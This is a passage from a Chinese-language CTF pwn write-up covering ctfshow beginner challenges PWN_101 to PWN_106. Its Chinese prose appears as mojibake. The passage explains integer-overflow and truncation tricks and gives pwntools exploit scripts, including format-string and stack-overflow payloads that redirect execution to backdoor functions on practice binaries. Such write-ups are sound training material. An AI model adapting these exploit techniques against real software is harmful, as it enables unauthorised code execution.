</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">((</span><span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0xf56</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;c%10$hn&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ€»ç»“ä¸€ä¸‹å§ï¼Œè¿™é¢˜æ¯”è¾ƒéš¾å•Šï¼Œå…¥é—¨PWNå‹åŠ›æœ‰ç‚¹å¤§&hellip;</p>
<p>æ€è·¯å°±æ˜¯ï¼š</p>
<ol>
<li>å…ˆè§£é™¤æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨é™åˆ¶ï¼ˆæ¯æ¬¡è¿è¡Œfmt_attackå‡½æ•°å°±å°†a1è¦†ç›–æˆ0é¿å¼€æ£€æŸ¥ï¼‰ï¼›</li>
<li>æ³„éœ²mainå‡½æ•°çš„æ ˆä½rbpçœŸå®åœ°å€ï¼ˆå³ä½¿å¼€PIEä¿æŠ¤ä¹Ÿæ²¡äº‹ï¼Œå› ä¸ºPIEä¿æŠ¤æ˜¯æ¯æ¬¡è¿è¡Œéƒ½ä¼šæ”¹å˜åœ°å€ï¼Œè€Œè¿™ä¸ªåœ°å€éƒ½æ˜¯åœ¨åŒä¸€ç¨‹åºè¿›ç¨‹ä¸‹å»åˆ©ç”¨çš„ï¼‰ï¼Œä»è€Œè®¡ç®—å¾—åˆ°fmt_attackå‡½æ•°çš„è¿”å›åœ°å€ï¼›</li>
<li>æ³„éœ²è¿”å›åœ°å€ä¸Šçš„å€¼ï¼Œä¹Ÿå°±æ˜¯mainå‡½æ•°çš„æŸä¸ªçœŸå®åœ°å€ï¼Œå†å’Œå¯¹åº”çš„åç§»åœ°å€ç›¸å‡ç®— elf åŸºå€ï¼›</li>
<li>elfåŸºåœ°å€+åç§»åœ°å€ = åé—¨çœŸå®åœ°å€ï¼Œå†™å…¥fmt_attack()å‡½æ•°è¿”å›åœ°å€ï¼›</li>
<li>è·³è½¬æ‰§è¡Œåé—¨åœ°å€ï¼Œå¾—åˆ°flagã€‚</li>
</ol>
<h2 id="æ•´æ•°å®‰å…¨">æ•´æ•°å®‰å…¨
</h2><h3 id="pwn_101">PWN_101
</h3><p>é¢˜ç›®ï¼šå…ˆå­¦ç‚¹ä¸œè¥¿å§ã€‚</p>
<p>checksecçœ‹åˆ°æ˜¯64ä½ä¿æŠ¤å…¨å¼€ï¼ˆä¸¤çœ¼ä¸€é»‘&hellip;ï¼‰</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/357.png"
	width="821"
	height="205"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/357_hu_3be2a668bbb18935.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/357_hu_abce242765d0b1c4.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="400"
		data-flex-basis="961px"
	
></p>
<p>IDAåˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/355.png"
	width="754"
	height="124"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/355_hu_e2d50dc1d9ed0d54.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/355_hu_16a94ff6f0577093.png 1024w"
	loading="lazy"
	
		alt="giftå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="608"
		data-flex-basis="1459px"
	
></p>
<p>è¿™æœ‰ä¸€ä¸ªgiftçš„åé—¨å‡½æ•°ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/356.png"
	width="935"
	height="576"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/356_hu_1e927daec265aa6.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/356_hu_70609d44f093cec1.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="162"
		data-flex-basis="389px"
	
></p>
<p>å…ˆçœ‹åˆ°usefulå‡½æ•°ï¼Œçœ‹åˆ°èµ‹å€¼<code>v4 = 0x80000000;v5 = 0x7FFFFFFF</code>ï¼Œç”¨æˆ·éœ€è¦è¾“å…¥ä¸¤ä¸ªæ•´æ•°ï¼Œå¹¶å­˜å‚¨åœ¨v4å’Œv5ä¸­ï¼Œè¿™é‡Œè¿˜çœ‹åˆ°<code>unsigned int</code>ï¼Œè¿”å›å€¼è¢«å¼ºåˆ¶è½¬æ¢ä¸ºæ— ç¬¦å·æ•°ç„¶åä¸2è¿›è¡Œæ¯”è¾ƒã€‚æ»¡è¶³åè¿›å…¥ä¸‹ä¸€ä¸ªifè¯­å¥ï¼Œä¸æ»¡è¶³åˆ™è¾“å‡ºé”™è¯¯ä¿¡æ¯ã€‚</p>
<p>æˆ‘ä»¬è¦æƒ³ç»™v4å’Œv5è¾“å…¥ä»€ä¹ˆå€¼å‘¢ï¼Ÿè¿™é‡Œå°±éœ€è¦å‚è€ƒæˆ‘ä»¬çš„<a class="link" href="https://expl0rer.top/p/pwn-4/#%e6%95%b4%e6%95%b0%e6%ba%a2%e5%87%ba%e6%bc%8f%e6%b4%9e%e7%9a%84%e5%ae%9a%e4%b9%89"  target="_blank" rel="noopener"
    >PWN-4</a>ï¼Œçœ‹è¾“å…¥ä»€ä¹ˆå€¼èƒ½getshellï¼Œåªè¦æ»¡è¶³ï¼ˆv4 == 0x80000000 &amp;&amp; v5 == 0x7FFFFFFFï¼‰å°±è¡Œäº†ï¼š</p>
<p>ä½†æ˜¯ç…§ç€æ¥æ˜¯é”™çš„ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/358.png"
	width="1241"
	height="419"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/358_hu_5068489f56094d97.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/358_hu_b075aec37c0b015b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="296"
		data-flex-basis="710px"
	
></p>
<p>æˆ‘çŸ¥é“äº†ï¼Œå› ä¸ºç¨‹åºä¸­ä½¿ç”¨çš„ <code>%d</code> æ ¼å¼ç¬¦<strong>åªæ¥å—åè¿›åˆ¶æ•´æ•°è¾“å…¥</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¾“å…¥åè¿›åˆ¶çš„æ•°è¿›å»å°±å¯ä»¥äº†ï¼š</p>
<p>-2147483648 2147483647</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/359.png"
	width="1254"
	height="603"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/359_hu_945bd314c7478644.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/359_hu_818c3f913fd3bfd1.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="207"
		data-flex-basis="499px"
	
></p>
<h3 id="pwn_102">PWN_102
</h3><p>é¢˜ç›®ï¼šè¿˜æ˜¯ç®€å•çš„çŸ¥è¯†ã€‚</p>
<p>checksecï¼Œè¿˜æ˜¯64ä¿æŠ¤å…¨å¼€ã€‚</p>
<p>IDA64ä½åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/360.png"
	width="935"
	height="384"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/360_hu_faaef6bb12151a47.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/360_hu_871d409b4bc69775.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="243"
		data-flex-basis="584px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/361.png"
	width="735"
	height="129"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/361_hu_dd719de71782689f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/361_hu_54fdc07add97194b.png 1024w"
	loading="lazy"
	
		alt="giftå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="569"
		data-flex-basis="1367px"
	
></p>
<p>è¿˜æ˜¯ä¸ªåé—¨å‡½æ•°ã€‚</p>
<p>çœ‹åˆ°mainå‡½æ•°ï¼Œåªéœ€è¦v4çš„å€¼æ»¡è¶³è®©ifåˆ¤æ–­ä¸º-1æ‰å¯getshellï¼Œè¿™é‡Œscanfè¾“å…¥çš„æ˜¯ä¸€ä¸ª%uæ— ç¬¦å·åè¿›åˆ¶çš„æ•´æ•°ï¼Œæƒ³åŠæ³•è®©v4==-1ï¼Œè¿™é‡Œæœ‰ä¸ªç»†èŠ‚ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹-1çš„åå…­è¿›åˆ¶ï¼ˆæŒ‰â€œHâ€é”®ï¼‰</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/362.png"
	width="785"
	height="390"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/362_hu_3bf3d1fcb1358682.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/362_hu_9a67d3c7f5c27a91.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="201"
		data-flex-basis="483px"
	
></p>
<p>æŒ‰â€œDâ€é”®è½¬æ¢æˆåè¿›åˆ¶ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/363.png"
	width="800"
	height="219"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/363_hu_ff7f22127af1377f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/363_hu_e0a9185c5aaa4cb8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="365"
		data-flex-basis="876px"
	
></p>
<p>ä¹Ÿå°±æ˜¯è¯´æ­¤æ—¶æˆ‘ä»¬åªè¦æ³¨å…¥<code>4294967295</code>å°±å¯ä»¥getshellã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/364.png"
	width="1150"
	height="531"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/364_hu_1163df2fa0809f5c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/364_hu_76ad205ffa48ac3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="216"
		data-flex-basis="519px"
	
></p>
<blockquote>
<blockquote class="alert alert-tip">
    </blockquote>
<p>åšäº†è¿™ä¸¤é¢˜ä½ å°±å¯ä»¥æ›´å¥½çš„ç†è§£æ•´æ•°å®‰å…¨äº†ï¼Œå®ƒå…¶å®è€ƒå¯ŸèŒƒå›´å¹¶ä¸å¹¿ï¼Œä½†ä¸ä»£è¡¨ä¸é‡è¦ï¼Œåœ¨å®é™…ç½‘ç»œå®‰å…¨é¢†åŸŸä¸­ï¼Œç¨‹åºè®¾è®¡ç¨åŠ ä¸æ³¨æ„å°±ä¼šè¢«ç»•è¿‡åˆ©ç”¨æ¼æ´ä»è€Œè¢«æ”»å‡»ã€‚</p>
</blockquote>
<h3 id="pwn_103">PWN_103
</h3><p>é¢˜ç›®ï¼šçœ‹ç€å¥½åƒè¿˜æ˜¯ä¸éš¾ã€‚</p>
<p>checksecï¼Œè¿˜æ˜¯64ä¿æŠ¤å…¨å¼€ã€‚</p>
<p>IDAåˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/365.png"
	width="914"
	height="535"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/365_hu_ea9af765dd456d90.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/365_hu_59ee0339dc58b9dd.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="170"
		data-flex-basis="410px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/366.png"
	width="750"
	height="134"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/366_hu_f611e9673286bfe8.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/366_hu_8e5ac35167327f11.png 1024w"
	loading="lazy"
	
		alt="giftå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="559"
		data-flex-basis="1343px"
	
></p>
<p>gift()æ˜¯ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œé€»è¾‘è¿˜æ˜¯å¾ˆç®€å•ï¼Œæ»¡è¶³å…¶æ¡ä»¶è¿›å…¥giftå‡½æ•°å³å¯ã€‚æˆ–è€…ä¸¤æ¬¡è¾“å…¥â€œ0â€å³å¯ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/367.png"
	width="1204"
	height="648"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/367_hu_f2988d42edacb38b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/367_hu_36d6f27cf184f2cc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="185"
		data-flex-basis="445px"
	
></p>
<h3 id="pwn_104">PWN_104
</h3><p>é¢˜ç›®ï¼šæœ‰ä»€ä¹ˆæ˜¯å¯æ§çš„ï¼Ÿ</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/368.png"
	width="856"
	height="200"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/368_hu_b4c4770f85cbbcf9.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/368_hu_77d018b9f23ad6e2.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="428"
		data-flex-basis="1027px"
	
></p>
<p>64ä½ç¨‹åºå…³é—­Canaryä¸PIEï¼Œéƒ¨åˆ†å¼€å¯RELROã€‚</p>
<p>IDAåˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/369.png"
	width="699"
	height="235"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/369_hu_a73db635513364bb.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/369_hu_e77b3035b82c73b3.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="297"
		data-flex-basis="713px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/370.png"
	width="755"
	height="91"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/370_hu_509df9aedca48147.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/370_hu_93367c4068543e2e.png 1024w"
	loading="lazy"
	
		alt="thatå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="829"
		data-flex-basis="1991px"
	
></p>
<p>å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œé€šè¿‡<code>read(0, buf, (unsigned int)nbytes);</code>å°†æˆ‘ä»¬è¾“å…¥çš„æ•°æ®è½¬ä¸ºæ— ç¬¦å·æ•´æ•°å­˜åˆ°bufæ•°ç»„ä¸­ã€‚ç®€å•æ¥è¯´æˆ‘ä»¬åªéœ€è¦å…ˆåˆ©ç”¨&amp;nbytesæ§åˆ¶æº¢å‡ºé•¿åº¦ï¼Œç„¶åå†ä½¿ç”¨bufå®ç°æº¢å‡ºæ§åˆ¶ç¨‹åºåˆ°åä»¬å‡½æ•°å³å¯ã€‚</p>
<p>exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28224</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">that</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;that&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;How long are you?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">30</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Who are you?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0xE</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">that</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_105">PWN_105
</h3><p>é¢˜ç›®ï¼šçœ‹ç€å¥½åƒæ²¡å•¥é—®é¢˜ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/371.png"
	width="850"
	height="205"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/371_hu_b4d13fd39a02327f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/371_hu_d8b0e01a519e94bd.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="414"
		data-flex-basis="995px"
	
></p>
<p>32ä½å…³é—­Canary ä¸PIEã€‚</p>
<p>IDAåˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/372.png"
	width="821"
	height="289"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/372_hu_b52318857885916b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/372_hu_87372984aa687f80.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="284"
		data-flex-basis="681px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/373.png"
	width="785"
	height="310"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/373_hu_65618f51ee2eb636.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/373_hu_80a0cf4029818ff2.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="253"
		data-flex-basis="607px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/374.png"
	width="764"
	height="105"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/374_hu_cf4ab635fb3601c7.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/374_hu_121716963cdf79fe.png 1024w"
	loading="lazy"
	
		alt="successå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="727"
		data-flex-basis="1746px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæœ‰æ ˆæº¢å‡ºæ¼æ´ï¼Œéœ€è¦é€šè¿‡ifåˆ¤æ–­ï¼Œè®©sçš„å€¼å¤åˆ¶ç»™destï¼Œdestæº¢å‡ºè¦†ç›–è¿”å›åœ°å€ï¼ˆè¿”å›åœ°å€æ”¹å†™æˆsuccesså‡½æ•°åœ°å€â€”â€”åé—¨å‡½æ•°ï¼‰ã€‚</p>
<p>åœ¨æ­¤ä¹‹å‰ï¼Œctfshowå‡½æ•°æœ‰<code>unsigned __int8 v3;</code>ï¼šå£°æ˜äº†ä¸€ä¸ª <strong>æ— ç¬¦å· 8 ä½æ•´æ•°å˜é‡ <code>v3</code></strong>ã€‚ç”±äºæ˜¯ 8 ä½æ— ç¬¦å·æ•´æ•°ï¼Œ<code>v3</code> çš„å–å€¼èŒƒå›´æ˜¯ <strong>0 åˆ° 255</strong>ï¼ˆ<code>0x00</code> åˆ° <code>0xFF</code>ï¼‰ï¼Œè¶…å‡ºäº†255å°±ä¼šå‘ç”Ÿâ€œæº¢å‡ºæˆªæ–­â€ï¼Œä¾‹å¦‚èµ‹å€¼256å°±ä¼šè¢«æˆªæ–­æˆ0ï¼Œèµ‹å€¼257å°±ä¼šè¢«æˆªæ–­æˆ1ï¼Œæˆ‘ä»¬åªéœ€è¦æ³¨å…¥å¡«å……ç¼“å†²åŒº+ebpæœ¬èº«4å­—èŠ‚+è¦†ç›–çš„åœ°å€ï¼Œå†ç”¨åƒåœ¾å€¼å¡«è¡¥è‡³èƒ½è®©v3å‘ç”Ÿæˆªæ–­çš„é•¿åº¦ï¼Œä¸”èƒ½è¢«æˆªæ–­æˆèŒƒå›´åœ¨<code>3u&lt;v3&lt;=8u</code>çš„é•¿åº¦å†…ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/375.png"
	width="1130"
	height="574"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/375_hu_a5f745d2df6399aa.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/375_hu_d992e714dfe25e8.png 1024w"
	loading="lazy"
	
		alt="è±†åŒ…"
	
	
		class="gallery-image" 
		data-flex-grow="196"
		data-flex-basis="472px"
	
></p>
<p>æ­¤æ—¶payloadæ€»å…±é•¿åº¦æ˜¯260ï¼Œï¼Œç»è¿‡v3çš„æˆªæ–­å˜æˆ4ï¼Œé€šè¿‡äº†ifçš„åˆ¤æ–­ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span><span class="s2">&#34;debug&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#34;./pwn&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;success&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x11</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload1</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x104</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_106">PWN_106
</h3><p>é¢˜ç›®ï¼šè¿˜æ˜¯éå¸¸ç®€å•ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/376.png"
	width="816"
	height="200"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/376_hu_f819cc9913bd934a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/376_hu_65330a23e85d3def.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="408"
		data-flex-basis="979px"
	
></p>
<p>32ä½å…³é—­Canaryä¸PIEã€‚</p>
<p>IDA32ä½åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/377.png"
	width="704"
	height="99"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/377_hu_1416772f0200d08c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/377_hu_c50bcd10d2b165d3.png 1024w"
	loading="lazy"
	
		alt="fffflagå‡½æ•°ï¼šåé—¨å‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="711"
		data-flex-basis="1706px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/378.png"
	width="929"
	height="590"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/378_hu_8d644de66012462a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/378_hu_c0b2078ac6ee3d6a.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="157"
		data-flex-basis="377px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/379.png"
	width="801"
	height="285"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/379_hu_9de21869f1da21da.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/379_hu_95335caee4cc7d27.png 1024w"
	loading="lazy"
	
		alt="loginå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="281"
		data-flex-basis="674px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/380.png"
	width="706"
	height="371"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/380_hu_4ea4166dff6887a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/380_hu_8490124e7c5f9de5.png 1024w"
	loading="lazy"
	
		alt="check_passwdå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="190"
		data-flex-basis="456px"
	
></p>
